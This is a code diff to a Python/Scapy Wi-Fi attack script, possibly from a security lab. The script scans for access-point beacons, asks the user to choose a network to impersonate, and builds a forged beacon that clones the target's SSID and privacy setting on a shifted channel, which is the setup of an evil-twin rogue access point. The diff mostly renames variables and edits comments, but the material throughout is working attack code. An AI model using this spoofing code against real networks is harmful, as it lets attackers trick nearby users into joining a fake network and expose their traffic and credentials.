@@ -20,8 +20,8 @@ parser.add_argument("-b", "--BSSID", required=False,
 args = parser.parse_args()
 
 # Global variables
-BSSID = []
-BSSIDToPacket = {}
+BSSIDs = []
+BSSIDPackets = {}
 
 
 # We sniff all Dot11 beacon packets, and store 1 packet per AP bssid
@@ -30,9 +30,9 @@ def packetHandler(p):
     Packet handler to analyse packet and discover new AP on the network
     :param p: the packet to analyse
     """
-    if p.haslayer(Dot11Beacon) and p.addr3 not in BSSID:
-        BSSID.append(str(p.addr3))
-        BSSIDToPacket[str(p.addr3)] = p
+    if p.haslayer(Dot11Beacon) and p.addr3 not in BSSIDs:
+        BSSIDs.append(str(p.addr3))
+        BSSIDPackets[str(p.addr3)] = p
         DisplayInfoAP(str(p.addr3))
 
 
@@ -41,9 +41,9 @@ def DisplayInfoAP(bssid):
     Display information about the AP
     :param bssid: the BSSID of the AP to display
     """
-    p = BSSIDToPacket[bssid]
+    p = BSSIDPackets[bssid]
     print("{:03d}) {} {} {:d} {:-32}".format(
-        BSSID.index(bssid), p.addr3, p.dBm_AntSignal, int(ord(p[Dot11Elt:3].info)), p.info.decode("utf-8")))
+        BSSIDs.index(bssid), p.addr3, p.dBm_AntSignal, int(ord(p[Dot11Elt:3].info)), p.info.decode("utf-8")))
     print("Press CTRL+C to stop scanning, and select target", end="\r")
 
 
@@ -68,7 +68,7 @@ def detectAP():
         while True:
             time.sleep(1)
     except (KeyboardInterrupt, SystemExit):
-        e.set() # signal thread to stop
+        e.set()  # signal thread to stop
         while t.is_alive():
             t.join(1.0)
 
@@ -77,14 +77,13 @@ detectAP()
 
 # User selection of the BSSID to spoof
 BSSID_Index = -1
-while 0 > BSSID_Index or len(BSSID) - 1 < BSSID_Index:
+while 0 > BSSID_Index or len(BSSIDs) - 1 < BSSID_Index:
     try:
         BSSID_Index = int(input(
             "\nPlease Select the number associated with the network you wish to impersonate [0-{:d}] : ".format(
-                len(BSSID) - 1)))
+                len(BSSIDs) - 1)))
     except ValueError:
         print("Invalid input")
-
 
 interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]
 
@@ -92,13 +91,14 @@ interface = netifaces.ifaddresses(args.Interface)[netifaces.AF_LINK]
 dot11 = Dot11(type=0, subtype=8, addr1=interface[0]['broadcast'], addr2=interface[0]['addr'],
               addr3=interface[0]['addr'] if not args.BSSID else args.BSSID)
 
-# Enable authentification in the beacon.
+# Enable authentication in the beacon as we want to spoof an authenticated network.
 beacon = Dot11Beacon(cap='ESS+privacy')
 
-essid = Dot11Elt(ID='SSID', info=BSSIDToPacket[BSSID[BSSID_Index]].info,
-                 len=len(BSSIDToPacket[BSSID[BSSID_Index]].info))
+targetPacket = BSSIDPackets[BSSIDs[BSSID_Index]]
+essid = Dot11Elt(ID='SSID', info=targetPacket.info,
+                 len=len(targetPacket.info))
 
-chn = int(ord(BSSIDToPacket[BSSID[BSSID_Index]][Dot11Elt:3].info))
+chn = int(ord(targetPacket[Dot11Elt:3].info))
 
 chn = chn - 6 if chn > 6 else chn + 6
 
